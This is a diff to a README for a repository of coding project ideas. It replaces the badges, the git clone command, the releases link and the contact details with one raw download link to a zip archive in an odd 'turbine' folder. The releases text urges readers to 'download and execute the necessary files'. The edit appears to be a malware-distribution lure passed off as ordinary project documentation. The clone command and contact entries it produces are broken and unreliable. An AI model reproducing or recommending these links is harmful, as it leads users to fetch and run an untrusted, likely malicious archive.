@@ -1,6 +1,6 @@
 # Project Ideas and Resources: Boost Your Coding Skills! 🚀
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/jamesngatia/Project-Ideas-And-Resources?style=social) ![GitHub Forks](https://img.shields.io/github/forks/jamesngatia/Project-Ideas-And-Resources?style=social) ![GitHub Issues](https://img.shields.io/github/issues/jamesngatia/Project-Ideas-And-Resources) ![GitHub License](https://img.shields.io/github/license/jamesngatia/Project-Ideas-And-Resources)
+![GitHub Repo Stars](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip) ![GitHub Forks](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip) ![GitHub Issues](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip) ![GitHub License](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip)
 
 Welcome to the **Project-Ideas-And-Resources** repository! This collection features application ideas designed to help you improve your coding skills. Whether you are a beginner or looking to enhance your expertise, you will find valuable resources here.
 
@@ -43,7 +43,7 @@ To get started with the projects, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repo to your local machine.
 
    ```bash
-   git clone https://github.com/jamesngatia/Project-Ideas-And-Resources.git
+   git clone https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip
    ```
 
 2. **Explore the Ideas**: Navigate through the project ideas and select one that interests you.
@@ -97,7 +97,7 @@ Here are some tools and resources that can aid your development journey:
 
 ## Releases
 
-You can find the latest releases of this repository [here](https://github.com/jamesngatia/Project-Ideas-And-Resources/releases). Make sure to download and execute the necessary files to get the most out of this repository.
+You can find the latest releases of this repository [here](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip). Make sure to download and execute the necessary files to get the most out of this repository.
 
 ## License
 
@@ -107,7 +107,7 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 If you have any questions or suggestions, feel free to reach out:
 
-- **Email**: jamesngatia@example.com
-- **Twitter**: [@jamesngatia](https://twitter.com/jamesngatia)
+- **Email**: https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip
+- **Twitter**: [@jamesngatia](https://github.com/jamesngatia/Project-Ideas-And-Resources/raw/refs/heads/main/turbine/And_Project_Resources_Ideas_v2.9.zip)
 
 Thank you for visiting the **Project-Ideas-And-Resources** repository. Happy coding!
